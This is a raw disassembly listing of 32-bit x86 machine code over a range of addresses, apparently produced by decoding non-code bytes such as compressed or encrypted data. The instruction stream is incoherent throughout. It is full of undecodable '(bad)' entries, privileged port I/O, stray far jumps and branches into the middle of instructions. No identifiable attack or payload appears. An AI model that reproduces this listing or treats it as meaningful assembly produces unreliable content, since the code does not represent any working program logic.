  40b757:	nop
  40b758:	mov    ebx,ecx
  40b75a:	xlat   BYTE PTR ds:[ebx]
  40b75b:	add    ebx,DWORD PTR [ebp-0x3]
  40b75e:	(bad)  
  40b75f:	loopne 0x40b77f
  40b761:	pop    edx
  40b762:	les    ebx,FWORD PTR [eax+0x71]
  40b765:	dec    esp
  40b766:	adc    ah,BYTE PTR [esi]
  40b768:	dec    eax
  40b769:	xchg   edx,eax
  40b76a:	ffree  st(6)
  40b76c:	mov    edx,0xd7556e6a
  40b771:	jnp    0x40b7cb
  40b773:	xlat   BYTE PTR ds:[ebx]
  40b774:	in     al,0x2b
  40b776:	(bad)  
  40b778:	inc    esi
  40b779:	scas   al,BYTE PTR es:[edi]
  40b77a:	sbb    eax,DWORD PTR [ebx+0x1b563630]
  40b780:	jl     0x40b783
  40b782:	adc    dl,BYTE PTR [eax+0x25]
  40b785:	or     DWORD PTR [ebx-0x3d366ac3],0x19
  40b78c:	xor    eax,0xa4ac46af
  40b791:	stc    
  40b792:	push   esi
  40b793:	mov    eax,0x795b1c79
  40b798:	xchg   ebx,eax
  40b799:	pop    ecx
  40b79a:	retf   0xa2be
  40b79d:	aad    0x6d
  40b79f:	(bad)  
  40b7a1:	push   ebx
  40b7a2:	in     eax,0x7e
  40b7a4:	ret    
  40b7a5:	and    BYTE PTR [ecx],ah
  40b7a7:	bound  edx,QWORD PTR [edi+0x69]
  40b7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ab:	inc    eax
  40b7ac:	xor    dh,BYTE PTR [eax]
  40b7ae:	xchg   edi,eax
  40b7af:	lods   eax,DWORD PTR ds:[esi]
  40b7b0:	push   DWORD PTR [edx-0x22c1fc15]
  40b7b6:	xlat   BYTE PTR ds:[ebx]
  40b7b7:	es in  eax,dx
  40b7b9:	jmp    0x2040:0x1f98d59a
  40b7c0:	xor    ebx,edi
  40b7c2:	mov    esp,0xf281e572
  40b7c7:	xor    DWORD PTR [edx+0x15a1ef0e],esp
  40b7cd:	xchg   ecx,eax
  40b7ce:	repnz repz and al,0x62
  40b7d2:	out    dx,eax
  40b7d3:	xchg   edi,eax
  40b7d4:	mov    BYTE PTR [edi+0x1b65c94c],ah
  40b7da:	fsub   QWORD PTR [edi*2+0x71a7fab1]
  40b7e1:	inc    esi
  40b7e2:	inc    ebp
  40b7e3:	test   DWORD PTR [ebx-0x13743cd8],edx
  40b7e9:	idiv   ch
  40b7eb:	fcomip st,st(5)
  40b7ed:	jle    0x40b7e4
  40b7ef:	imul   ebx,DWORD PTR [ecx-0x8694ea],0x70332381
  40b7f9:	and    esi,eax
  40b7fb:	outs   dx,DWORD PTR ds:[esi]
  40b7fc:	xchg   ecx,eax
  40b7fd:	pop    ss
  40b7fe:	xchg   esp,eax
  40b7ff:	mov    eax,0x34875495
  40b804:	mov    edx,0x200b9559
  40b809:	mov    ch,0xbb
  40b80b:	mov    DWORD PTR [edi-0x70],ecx
  40b80e:	mov    ebp,0x8c8b417e
  40b813:	xchg   ebp,eax
  40b814:	cmp    al,0xb3
  40b816:	idiv   DWORD PTR [ecx+eax*4-0x1a913328]
  40b81d:	mov    edx,0x7ee3109
  40b822:	push   ecx
  40b823:	push   0xffffffde
  40b825:	push   cs
  40b826:	jns    0x40b865
  40b828:	fiadd  WORD PTR [ebp+edx*8-0x43]
  40b82c:	push   cs
  40b82d:	ins    DWORD PTR es:[edi],dx
  40b82e:	jge    0x40b7db
  40b830:	gs es jne 0x40b7f9
  40b834:	daa    
  40b835:	xchg   esp,eax
  40b836:	jns    0x40b853
  40b838:	dec    edx
  40b839:	xchg   ebx,eax
  40b83a:	xlat   BYTE PTR cs:[ebx]
  40b83c:	out    dx,eax
  40b83d:	push   0x37969150
  40b842:	and    DWORD PTR [edx-0x79],0x6e
  40b846:	iret   
  40b847:	call   0x2e41:0xc00b3e44
  40b84e:	cwde   
  40b84f:	cs jecxz 0x40b8b8
  40b852:	iret   
  40b853:	sahf   
  40b854:	shl    DWORD PTR [edx+0x7c8c78ef],1
  40b85a:	outs   dx,DWORD PTR ds:[esi]
  40b85b:	jne    0x40b8b0
  40b85d:	(bad)  
  40b85e:	mov    ah,0xce
  40b860:	cwde   
  40b861:	js     0x40b8c6
  40b863:	jbe    0x40b8a8
  40b865:	pop    ss
  40b866:	scas   eax,DWORD PTR es:[edi]
  40b867:	aam    0xa3
  40b869:	fstp   TBYTE PTR [eax-0x12]
  40b86c:	ret    
  40b86d:	(bad)  
  40b86e:	into   
  40b86f:	or     eax,0xfa4c5a92
  40b874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b875:	popa   
  40b876:	in     al,dx
  40b877:	xchg   dh,ch
  40b879:	xchg   esp,eax
  40b87a:	adc    ecx,DWORD PTR [eax-0x48]
  40b87d:	xchg   DWORD PTR [esi],esi
  40b87f:	int    0xdd
  40b881:	or     DWORD PTR [ecx],0x37
  40b884:	in     eax,dx
  40b885:	xor    BYTE PTR [ecx+eax*2],0xb
  40b889:	(bad)  
  40b88b:	xor    eax,0x4f2b224c
  40b890:	cmp    al,0x80
  40b892:	jge    0x40b861
  40b894:	pop    edx
  40b895:	ret    0x90df
  40b898:	in     al,0x13
  40b89a:	retf   0xc069
  40b89d:	pop    ebx
  40b89e:	dec    edi
  40b89f:	sbb    cl,bh
  40b8a1:	shl    BYTE PTR [ebp*2-0x348d629c],0x6f
  40b8a9:	nop    DWORD PTR [edx-0x4e9626bc]
  40b8b0:	dec    ebp
  40b8b1:	jecxz  0x40b8b8
  40b8b3:	mov    ecx,0x8f51ca42
  40b8b8:	imul   eax,DWORD PTR [edi],0x21
  40b8bb:	pop    es
  40b8bc:	iret   
  40b8bd:	fcomp  DWORD PTR [esi+0x6dc2f83]
  40b8c3:	fisubr WORD PTR ds:0x76ef4a8f
  40b8c9:	es arpl bp,di
  40b8cc:	loopne 0x40b92b
  40b8ce:	jmp    0x40b853
  40b8d0:	mov    eax,ds:0xcc192e00
  40b8d5:	es pop edi
  40b8d7:	jecxz  0x40b927
  40b8d9:	and    al,0x73
  40b8db:	addr16 xor cl,cl
  40b8de:	and    dh,dl
  40b8e0:	adc    al,0x4d
  40b8e2:	jmp    0x40b8f8
  40b8e4:	xor    cl,bh
  40b8e6:	adc    cl,bl
  40b8e8:	adc    al,0x87
  40b8ea:	ins    BYTE PTR es:[edi],dx
  40b8eb:	inc    ecx
  40b8ec:	retf   0x8ea6
  40b8ef:	inc    edi
  40b8f0:	aas    
  40b8f1:	adc    BYTE PTR [edi],ah
  40b8f3:	lds    esi,FWORD PTR [eax-0x53]
  40b8f6:	sub    esi,esi
  40b8f8:	outs   dx,DWORD PTR ds:[esi]
  40b8f9:	bound  edx,QWORD PTR [ebx+ecx*4+0x25dc501d]
  40b900:	int    0xf7
  40b902:	sti    
  40b903:	push   ds
  40b904:	cmp    ch,BYTE PTR [edx-0x5ee22318]
  40b90a:	(bad)  
  40b90b:	fisttp WORD PTR [edi+0x4]
  40b90e:	jmp    0x40b988
  40b910:	push   DWORD PTR [ebx-0x4e022e7a]
  40b916:	jp     0x40b953
  40b918:	pushf  
  40b919:	and    al,0x4e
  40b91b:	es push cs
  40b91d:	push   edi
  40b91f:	adc    al,cl
  40b921:	sub    ebx,ebp
  40b923:	push   ss
  40b924:	jmp    0x7e71:0xdb7c89a0
  40b92b:	fwait
  40b92c:	inc    edi
  40b92d:	xor    dh,BYTE PTR [edi+0x76248be0]
  40b933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b934:	cmp    ah,BYTE PTR ds:0x44c54222
  40b93a:	retf   
  40b93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b93c:	mov    cl,0x0
  40b93e:	or     edi,edi
  40b940:	mov    ds,WORD PTR [ecx+0x13]
  40b943:	ins    DWORD PTR es:[edi],dx
  40b944:	sbb    eax,0x8348999c
  40b949:	sbb    eax,0xe36200a6
  40b94e:	push   esi
  40b94f:	xor    dl,BYTE PTR [esi+0x6c]
  40b952:	mov    cl,0x3b
  40b954:	xor    BYTE PTR [ebx+ebx*2+0x49],dl
  40b958:	xor    al,0xc5
  40b95a:	loopne 0x40b91d
  40b95c:	jns    0x40b986
  40b95e:	retf   0x162e
  40b961:	popa   
  40b962:	in     eax,0x81
  40b964:	gs fs loopne 0x40b921
  40b968:	pushf  
  40b969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96a:	cld    
  40b96b:	add    eax,0x939fc225
  40b970:	mov    ah,0x53
  40b972:	imul   ecx,DWORD PTR [ebp+esi*4-0x6e],0xa3f72b8c
  40b97a:	rcr    dl,0xa1
  40b97d:	call   0x359b:0x8720ebb1
  40b984:	fild   WORD PTR [eax-0x155df6ab]
  40b98a:	pop    esi
  40b98b:	cdq    
  40b98c:	adc    DWORD PTR [edx],eax
  40b98e:	push   ds
  40b98f:	ins    DWORD PTR es:[edi],dx
  40b990:	and    DWORD PTR [ebp-0x1f],0x0
  40b994:	aas    
  40b995:	pusha  
  40b996:	jne    0x40ba07
  40b998:	jae    0x40b975
  40b99a:	shl    DWORD PTR [ebp+edx*1+0x24217f33],cl
  40b9a1:	sbb    DWORD PTR [ecx],edi
  40b9a3:	lock lea esp,es:[ecx+0x6c13a921]
  40b9ab:	(bad)  
  40b9ac:	outs   dx,BYTE PTR ds:[esi]
  40b9ad:	iret   
  40b9ae:	aad    0x82
  40b9b0:	loop   0x40b944
  40b9b2:	adc    ebx,DWORD PTR [ecx]
  40b9b4:	push   esi
  40b9b5:	jne    0x40ba2b
  40b9b7:	jp     0x40b9e6
  40b9b9:	add    al,0x32
  40b9bb:	fnstenv [edi+ebp*4-0x16abd538]
  40b9c2:	clc    
  40b9c3:	aad    0x6a
  40b9c5:	jle    0x40b9a9
  40b9c7:	xchg   eax,eax
  40b9c9:	dec    edi
  40b9ca:	pop    ss
  40b9cb:	leave  
  40b9cc:	into   
  40b9cd:	xchg   BYTE PTR [ecx-0xebd241e],cl
  40b9d3:	or     esp,DWORD PTR [ebx+edi*4]
  40b9d6:	add    edi,ebx
  40b9d8:	mov    ds:0x98d0677b,eax
  40b9dd:	cmp    ebx,esp
  40b9df:	fstp   QWORD PTR [ebp-0x4c]
  40b9e2:	inc    eax
  40b9e3:	xlat   BYTE PTR ds:[ebx]
  40b9e4:	fucomip st,st(0)
  40b9e6:	hlt    
  40b9e7:	test   esi,ebx
  40b9e9:	imul   esp,DWORD PTR [edi+edx*2+0x1f],0x7ea82d7d
  40b9f1:	add    ebp,edx
  40b9f3:	in     al,0x36
  40b9f5:	loopne 0x40ba12
  40b9f7:	sub    esp,edx
  40b9f9:	mov    eax,0x7ef02e7c
  40b9fe:	aaa    
  40b9ff:	out    dx,al
  40ba00:	mov    dh,0x3c
  40ba02:	push   DWORD PTR [ecx+0x1ba8247]
  40ba08:	jmp    0x7dc3:0xd91bb0a1
  40ba0f:	jb     0x40b9b4
  40ba11:	mov    cl,0x43
  40ba13:	aad    0x5e
  40ba15:	pop    ecx
  40ba16:	imul   edx,DWORD PTR [eax],0xecb2f29a
  40ba1c:	icebp  
  40ba1d:	imul   eax,edi,0x8
  40ba20:	cmp    eax,0x613db35b
  40ba25:	mov    al,0x84
  40ba27:	xor    eax,ecx
  40ba29:	xchg   DWORD PTR [ebx+0x225f42d6],ebp
  40ba2f:	inc    edx
  40ba30:	retf   
  40ba31:	sub    bl,BYTE PTR [edi]
  40ba33:	addr16 add eax,ecx
  40ba36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba37:	jg     0x40ba0e
  40ba39:	pop    edx
  40ba3a:	fmul   st,st(4)
  40ba3c:	sub    esi,esi
  40ba3e:	hlt    
  40ba3f:	and    al,0xf7
  40ba41:	repnz pusha 
  40ba43:	pop    ecx
  40ba44:	std    
  40ba45:	stos   BYTE PTR es:[edi],al
  40ba46:	sbb    dh,BYTE PTR [esi+0xe]
  40ba49:	pop    ds
  40ba4a:	mov    dl,0x3e
  40ba4c:	shl    BYTE PTR [edi+ecx*4-0x4369d83f],cl
  40ba53:	jne    0x40ba46
  40ba55:	(bad)  
  40ba57:	sub    eax,0x9e626a1f
  40ba5c:	sti    
  40ba5d:	pop    eax
  40ba5e:	push   ebp
  40ba5f:	adc    DWORD PTR [ecx-0x1a334912],ebx
  40ba65:	fadd   QWORD PTR gs:[eax-0x22129855]
  40ba6c:	or     BYTE PTR [esi+0x13dc680],0x43
  40ba73:	imul   ecx,DWORD PTR [eax-0x45],0x87dd064f
  40ba7a:	jmp    0x475fa9d2
  40ba7f:	push   edx
  40ba80:	add    esi,ebp
  40ba82:	mov    ah,0x1a
  40ba84:	adc    al,0xcb
  40ba86:	repnz cli 
  40ba88:	push   ds
  40ba89:	(bad)  
  40ba8a:	cwde   
  40ba8b:	xlat   BYTE PTR ds:[ebx]
  40ba8c:	and    BYTE PTR [eax+0x760beaee],0x74
  40ba93:	mov    esp,0xffa4d620
  40ba98:	repz jecxz 0x40ba37
  40ba9b:	push   ebx
  40ba9c:	mov    ch,0xcc
  40ba9e:	jmp    0x21eb6198
  40baa3:	loop   0x40ba58
  40baa5:	mov    DWORD PTR [edi],ebx
  40baa7:	add    dl,ah
  40baa9:	fsubr  DWORD PTR [ecx]
  40baab:	stos   BYTE PTR es:[edi],al
  40baac:	iret   
  40baad:	je     0x40bafd
  40baaf:	xor    al,0xe5
  40bab1:	idiv   WORD PTR [edx]
  40bab4:	mov    ah,0x1c
  40bab6:	popf   
  40bab7:	popa   
  40bab8:	gs inc ebp
  40baba:	int    0x56
  40babc:	jge    0x40bb0e
  40babe:	sub    DWORD PTR [ebx-0x40],edx
  40bac1:	shr    DWORD PTR [ebx],cl
  40bac3:	inc    eax
  40bac4:	sbb    eax,0x4d4fb66b
  40bac9:	idiv   BYTE PTR [ebx+0x1f33b164]
  40bacf:	lock sbb BYTE PTR [eax-0x56],ch
  40bad3:	pop    ss
  40bad4:	leave  
  40bad5:	dec    edx
  40bad6:	cmp    BYTE PTR [eax-0x3e4e0214],dh
  40badc:	pushf  
  40badd:	cmp    ch,BYTE PTR [eax]
  40badf:	dec    ecx
  40bae0:	cld    
  40bae1:	stos   DWORD PTR es:[edi],eax
  40bae2:	jnp    0x40bb47
  40bae4:	xlat   BYTE PTR ds:[ebx]
  40bae5:	and    eax,0xf60bda10
  40baea:	jg     0x40ba9e
  40baec:	sbb    eax,0xf1792b59
  40baf1:	and    BYTE PTR [esi+ecx*8],0x6f
  40baf5:	pushf  
  40baf6:	ret    0xb9bd
  40baf9:	mov    ebp,ds
  40bafb:	je     0x40bb74
  40bafd:	cs mov bl,0x6f
  40bb00:	inc    ebp
  40bb01:	push   eax
  40bb02:	jmp    0x8ed47848
  40bb07:	imul   eax,ebx,0xc0bf7e21
  40bb0d:	leave  
  40bb0e:	out    dx,al
  40bb0f:	mov    DWORD PTR ds:0x98d1ffc5,esp
  40bb15:	pop    edi
  40bb16:	sbb    DWORD PTR [ebx+0x51],0x14
  40bb1a:	ror    BYTE PTR [esi-0x70],cl
  40bb1d:	inc    eax
  40bb1e:	or     dh,BYTE PTR [edi-0x2f]
  40bb21:	test   al,al
  40bb23:	into   
  40bb24:	adc    bh,dh
  40bb26:	xor    BYTE PTR [edx+0x22],cl
  40bb29:	push   0xf82e56b3
  40bb2e:	test   eax,0x6611aeaf
  40bb33:	mov    dl,0x3a
  40bb35:	xchg   esi,eax
  40bb36:	dec    esp
  40bb37:	pop    ss
  40bb38:	call   0x1d84:0x395b767b
  40bb3f:	xor    edx,esp
  40bb41:	sub    cl,BYTE PTR [ecx+0x29]
  40bb44:	mov    ebx,0x441d174e
  40bb49:	and    BYTE PTR [esi+0x11e138c],dh
  40bb4f:	push   edx
  40bb50:	push   edi
  40bb51:	aas    
  40bb52:	aas    
  40bb53:	inc    edx
  40bb54:	in     al,dx
  40bb55:	mov    al,0x1b
  40bb57:	nop
  40bb58:	sbb    al,0xa6
  40bb5a:	pop    ebx
  40bb5b:	(bad)  
  40bb5c:	sub    al,0x85
  40bb5e:	push   eax
  40bb5f:	(bad)  
  40bb60:	cmc    
  40bb61:	mov    bl,0xd5
  40bb63:	test   ecx,eax
  40bb65:	test   eax,0x5e3bf26c
  40bb6a:	dec    esi
  40bb6b:	ds sahf 
  40bb6d:	in     eax,0xc8
  40bb6f:	and    ebp,DWORD PTR [edi+0x5018395]
  40bb75:	ds stc 
  40bb77:	xor    DWORD PTR [eax],esi
  40bb79:	fwait
  40bb7a:	test   al,0x7
  40bb7c:	sub    dh,BYTE PTR [edx-0xe]
  40bb7f:	std    
  40bb80:	add    DWORD PTR [edx+0x52ff6edc],esp
  40bb86:	jle    0x40bb8b
  40bb88:	inc    edx
  40bb89:	(bad)  
  40bb8a:	pusha  
  40bb8b:	nop
  40bb8c:	xor    eax,DWORD PTR [ebx+0x39]
  40bb8f:	(bad)  
  40bb90:	dec    ebp
  40bb91:	cs sub al,0xcf
  40bb94:	adc    DWORD PTR [edx+0x48],ebx
  40bb97:	jbe    0x40bb86
  40bb99:	stos   BYTE PTR es:[edi],al
  40bb9a:	ins    DWORD PTR es:[edi],dx
  40bb9b:	in     eax,dx
  40bb9c:	or     BYTE PTR [ebx+eax*1],0xc1
  40bba0:	push   0x1d
  40bba2:	outs   dx,BYTE PTR ds:[esi]
  40bba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bba4:	add    BYTE PTR [edx],bh
  40bba6:	push   ecx
  40bba7:	mov    esi,0xa7232391
  40bbac:	sub    al,0xc
  40bbae:	ret    0xac80
  40bbb1:	fnsave [edx+ecx*4-0x6d]
  40bbb5:	xor    al,BYTE PTR [edi+0x10]
  40bbb8:	jmp    0x40bc09
  40bbba:	call   0xf9936796
  40bbbf:	(bad)  
  40bbc0:	inc    esi
  40bbc1:	inc    ebx
  40bbc2:	push   ebp
  40bbc3:	out    dx,al
  40bbc4:	add    al,0x5f
  40bbc6:	pop    esi
  40bbc7:	dec    di
  40bbc9:	lods   eax,DWORD PTR ds:[esi]
  40bbca:	sub    dl,BYTE PTR [edi]
  40bbcc:	adc    dh,cl
  40bbce:	ins    DWORD PTR es:[edi],dx
  40bbcf:	sahf   
  40bbd0:	aam    0xa6
  40bbd2:	inc    BYTE PTR [ebp+0x7b]
  40bbd5:	mov    WORD PTR ds:0xfad2133f,ss
  40bbdb:	call   0x2a9a:0xd9d842d3
  40bbe2:	in     al,0xba
  40bbe4:	ret    
  40bbe5:	cmp    DWORD PTR [ebx],ebp
  40bbe7:	push   es
  40bbe8:	and    al,cl
  40bbea:	lahf   
  40bbeb:	xor    al,0x5f
  40bbed:	inc    ebx
  40bbee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbef:	jb     0x40bc62
  40bbf1:	mov    ah,0xc2
  40bbf3:	and    ch,bl
  40bbf5:	lds    eax,FWORD PTR ds:0x9aa5ebcc
  40bbfb:	retf   
  40bbfc:	pop    es
  40bbfd:	loop   0x40bb86
  40bbff:	clc    
  40bc00:	dec    eax
  40bc01:	fs fucomp st(3)
  40bc04:	or     ah,BYTE PTR [ebx+0x18]
  40bc07:	mul    al
  40bc09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc0a:	inc    ecx
  40bc0b:	xor    DWORD PTR [ebp+ebp*1+0x7c4a9d9b],0xffffffbc
  40bc13:	jae    0x40bb97
  40bc15:	pop    ebp
  40bc16:	cmp    BYTE PTR [edi],ah
  40bc18:	sbb    al,0xfb
  40bc1a:	(bad)  
  40bc1b:	ins    DWORD PTR es:[edi],dx
  40bc1c:	xchg   BYTE PTR [esi+0xe],dh
  40bc1f:	jp     0x40bbaf
  40bc21:	push   es
  40bc22:	add    DWORD PTR [esp+ebx*1],0x14
  40bc26:	ret    0xb3ff
  40bc29:	cwde   
  40bc2a:	nop
  40bc2b:	xchg   esi,eax
  40bc2c:	push   0xffffff8c
  40bc2e:	push   es
  40bc2f:	xor    eax,0x366e4a18
  40bc34:	cli    
  40bc35:	inc    edx
  40bc36:	call   0xd865ee04
  40bc3b:	aaa    
  40bc3c:	retf   0xa0c7
  40bc3f:	sbb    eax,0xb05981ce
  40bc44:	sub    al,0x8e
  40bc46:	add    DWORD PTR [eax+0x36],0x37f317f3
  40bc4d:	mov    ds:0xa6edcd64,eax
  40bc52:	add    edx,eax
  40bc54:	aam    0xa5
  40bc56:	adc    al,0xf7
  40bc58:	jp     0x40bcd8
  40bc5a:	test   al,0x84
  40bc5c:	or     DWORD PTR [esp+ebp*4+0x3226f550],ebx
  40bc63:	(bad)  
  40bc64:	fld    st(4)
  40bc66:	xor    dl,BYTE PTR [ecx+edx*2]
  40bc69:	retf   
  40bc6a:	sbb    esi,DWORD PTR [edi-0x5d]
  40bc6d:	iret   
  40bc6e:	repz sbb edx,ebx
  40bc71:	inc    ebp
  40bc72:	jg     0x40bbfc
  40bc74:	cmp    al,0x1f
  40bc76:	clc    
  40bc77:	adc    al,BYTE PTR [eax-0x7c2e7200]
  40bc7d:	arpl   WORD PTR [eax],ax
  40bc7f:	test   BYTE PTR [esi+eiz*4+0x601e16b],0x9
  40bc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc88:	daa    
  40bc89:	mov    bh,0x52
  40bc8b:	mov    edi,0xf52b150b
  40bc90:	mov    dl,0x60
  40bc92:	shl    BYTE PTR [edi+0x1ca1fd02],cl
  40bc98:	mov    bl,0xff
  40bc9a:	rcl    DWORD PTR [eax-0x4f583e8],cl
  40bca0:	(bad)  
  40bca1:	addr16 loop 0x40bd12
  40bca4:	repnz out dx,eax
  40bca6:	push   ds
  40bca7:	inc    ebx
  40bca8:	mov    ebx,0xbdeb6aad
  40bcad:	xor    al,0xd0
  40bcaf:	cdq    
  40bcb0:	mov    al,0x59
  40bcb2:	out    dx,al
  40bcb3:	sbb    DWORD PTR [ebx-0x5d],ecx
  40bcb6:	ins    BYTE PTR es:[edi],dx
  40bcb7:	mov    ebx,DWORD PTR [ebp-0x33]
  40bcba:	fcmovnu st,st(2)
  40bcbc:	arpl   WORD PTR [ebx],sp
  40bcbe:	jp     0x40bc4a
  40bcc0:	cdq    
  40bcc1:	jmp    0x86e7:0xcef75bc2
  40bcc8:	push   0x46
  40bcca:	ins    BYTE PTR es:[edi],dx
  40bccb:	dec    ebp
  40bccc:	or     cl,bh
  40bcce:	test   BYTE PTR [esi+0x57],0x4
  40bcd2:	into   
  40bcd3:	mov    ds:0xf020fb7e,eax
  40bcd8:	test   eax,0x2907aeac
  40bcdd:	and    al,0xa2
  40bcdf:	lds    ebp,FWORD PTR [edx]
  40bce1:	jbe    0x40bd28
  40bce3:	shl    DWORD PTR [ebx-0x33],cl
  40bce6:	jo     0x40bcc8
  40bce8:	addr16 jbe 0x40bca9
  40bceb:	jb     0x40bd0e
  40bced:	in     al,0x4b
  40bcef:	mov    ebp,0x3a98694c
  40bcf4:	aad    0xbb
  40bcf6:	jne    0x40bcd8
  40bcf8:	adc    esp,0x35
  40bcfb:	adc    BYTE PTR es:[ecx-0x6e114ecd],al
  40bd02:	je     0x40bc98
  40bd04:	push   0xffffffb0
  40bd06:	pop    edi
  40bd07:	push   cs
  40bd08:	push   0xb687a7d7
  40bd0d:	outs   dx,BYTE PTR ds:[esi]
  40bd0e:	xor    eax,DWORD PTR [edx-0x29f83b48]
  40bd14:	xchg   ebx,eax
  40bd15:	adc    edi,DWORD PTR [ebx+0x59]
  40bd18:	cmp    al,0x24
  40bd1a:	add    esi,edx
  40bd1c:	gs dec edx
  40bd1e:	jmp    0xaccf:0x20585770
  40bd25:	adc    eax,0x1c6c6a5e
  40bd2a:	inc    ebx
  40bd2b:	call   0x6cc62a7e
  40bd30:	dec    edx
  40bd31:	jns    0x40bda7
  40bd33:	stos   BYTE PTR es:[edi],al
  40bd34:	inc    eax
  40bd35:	es stos BYTE PTR es:[edi],al
  40bd37:	cmp    edi,DWORD PTR [edx+0x7421a763]
  40bd3d:	fs mov ebp,eax
  40bd40:	and    al,0x87
  40bd42:	aad    0xd3
  40bd44:	aad    0xe2
  40bd46:	pop    ss
  40bd47:	lock (bad) 
  40bd49:	cmp    BYTE PTR [edi+edi*2],cl
  40bd4c:	ss popf 
  40bd4e:	dec    edx
  40bd4f:	push   eax
  40bd50:	fcom   QWORD PTR [edx+0x32]
  40bd53:	cmp    BYTE PTR [eax],cl
  40bd55:	retf   0x3e41
  40bd58:	aas    
  40bd59:	cwde   
  40bd5a:	dec    ebp
  40bd5b:	hlt    
  40bd5c:	add    eax,0xb2840b5e
  40bd61:	outs   dx,DWORD PTR ds:[esi]
  40bd62:	ficomp WORD PTR [eax]
  40bd64:	jnp    0x40bcee
  40bd66:	cmp    BYTE PTR [ebx+0x26],bl
  40bd69:	cld    
  40bd6a:	mov    eax,0x833617d2
  40bd6f:	push   ss
  40bd70:	pop    edi
  40bd71:	mov    ah,0x5b
  40bd73:	mov    bh,bh
  40bd75:	shl    esp,1
  40bd77:	outs   dx,DWORD PTR ds:[esi]
  40bd78:	xlat   BYTE PTR ds:[ebx]
  40bd79:	(bad)  
  40bd7a:	fmul   QWORD PTR [esi-0x4a32f242]
  40bd80:	bound  esp,QWORD PTR [ebp-0x31ea939a]
  40bd86:	sbb    al,0x59
  40bd88:	arpl   WORD PTR [ebx+0x41],dx
  40bd8b:	xor    al,0xea
  40bd8d:	shr    BYTE PTR [ecx],0xed
  40bd90:	adc    DWORD PTR [ebp-0x54],ecx
  40bd93:	jne    0x40be0b
  40bd95:	ins    DWORD PTR es:[edi],dx
  40bd96:	(bad)  
  40bd97:	fsubr  DWORD PTR ds:0xf2d5802b
  40bd9d:	mov    esi,0x5d1ddf64
  40bda2:	pop    ds
  40bda3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bda4:	fcmove st,st(5)
  40bda6:	push   ss
  40bda7:	jg     0x40bdde
  40bda9:	xor    DWORD PTR [ebx+ecx*2],eax
  40bdac:	fdivr  DWORD PTR [eax]
  40bdae:	mov    eax,ds:0xaa6d9468
  40bdb3:	rcl    DWORD PTR ds:0xd275bd81,cl
  40bdb9:	hlt    
  40bdba:	inc    edi
  40bdbb:	add    BYTE PTR [ebx+0x735f360e],bh
  40bdc1:	rcr    DWORD PTR [ebx-0x3c],cl
  40bdc4:	popf   
  40bdc5:	retf   
  40bdc6:	xor    DWORD PTR ds:[edi-0x33147b1a],edx
  40bdcd:	ins    DWORD PTR es:[edi],dx
  40bdce:	mov    bl,0x6f
  40bdd0:	xchg   BYTE PTR [ecx+edi*2+0x31ca0c44],ch
  40bdd7:	pop    es
  40bdd8:	shl    DWORD PTR [edi],0xb1
  40bddb:	dec    edi
  40bddc:	repnz or DWORD PTR [ecx],esp
  40bddf:	jns    0x40be41
  40bde1:	mov    al,ds:0x3896c834
  40bde6:	push   ds
  40bde7:	test   DWORD PTR [ecx-0x84b837c],edi
  40bded:	leave  
  40bdee:	loopne 0x40bdd5
  40bdf0:	loop   0x40be4b
  40bdf2:	in     eax,dx
  40bdf3:	and    DWORD PTR [edx-0x4],ecx
  40bdf6:	pop    ds
  40bdf7:	aaa    
  40bdf8:	xor    DWORD PTR [ebx+0x33],ecx
  40bdfb:	(bad)
  40bdff:	mov    al,ds:0x4070945
  40be04:	jmp    0x40bdaf
  40be06:	sub    edx,DWORD PTR [ecx+0x1d]
  40be09:	enter  0x199c,0xd
  40be0d:	adc    eax,0x55081043
  40be12:	scas   al,BYTE PTR es:[edi]
  40be13:	outs   dx,DWORD PTR ds:[esi]
  40be14:	xor    dh,BYTE PTR [edi+0xd]
  40be17:	dec    esp
  40be18:	push   ebx
  40be19:	push   ecx
  40be1a:	xor    DWORD PTR [edx-0x165a9289],0x6a7758a2
  40be24:	push   edi
  40be25:	push   edi
  40be26:	mov    dh,dh
  40be28:	std    
  40be29:	mov    al,ds:0xae782345
  40be2e:	xor    BYTE PTR [ebp-0x74],cl
  40be31:	pop    ss
  40be32:	shl    BYTE PTR [ecx-0x5f],1
  40be35:	sub    eax,0x272f4fe1
  40be3a:	test   BYTE PTR [ecx+0x63],0xfe
  40be3e:	out    0xa8,al
  40be40:	sub    al,0x50
  40be42:	rcl    BYTE PTR [ecx+esi*1],1
  40be45:	pop    ds
  40be46:	push   0xffffffd7
  40be48:	nop
  40be49:	push   edi
  40be4a:	fstp   QWORD PTR [edi]
  40be4c:	or     ah,BYTE PTR [eax]
  40be4e:	mov    al,0x89
  40be50:	jmp    0x3fb9d406
  40be55:	adc    al,0x9d
  40be57:	outs   dx,BYTE PTR ds:[esi]
  40be58:	push   eax
  40be59:	shr    DWORD PTR [esi-0x28],1
  40be5c:	cmp    ah,dh
  40be5e:	lock repnz aaa 
  40be61:	mov    edi,0x634b2f9d
  40be66:	(bad)  
  40be67:	div    DWORD PTR [ecx-0x3fd74efc]
  40be6d:	iret   
  40be6e:	shl    ch,cl
  40be70:	cld    
  40be71:	cmp    edx,DWORD PTR [eax-0x1551509d]
  40be77:	mov    edx,0xdcef6d0b
  40be7c:	nop
  40be7d:	iret   
  40be7e:	daa    
  40be7f:	shl    BYTE PTR [ebx-0x3a78fd10],cl
  40be85:	dec    ecx
  40be86:	cdq    
  40be87:	repnz push ecx
  40be89:	mov    ss,WORD PTR [eax-0x7b]
  40be8c:	(bad)  
  40be8d:	sub    dh,BYTE PTR [edi+0x6e3f5294]
  40be93:	dec    ebx
  40be94:	mov    ch,0x28
  40be96:	mov    esi,0x25a41fd3
  40be9b:	push   edx
  40be9c:	push   ecx
  40be9d:	push   bx
  40be9f:	jl     0x40be5f
  40bea1:	xchg   DWORD PTR [ebx+0x5287f19d],eax
  40bea7:	pop    esi
  40bea8:	test   al,0xdf
  40beaa:	sub    BYTE PTR [edi+0x63],ah
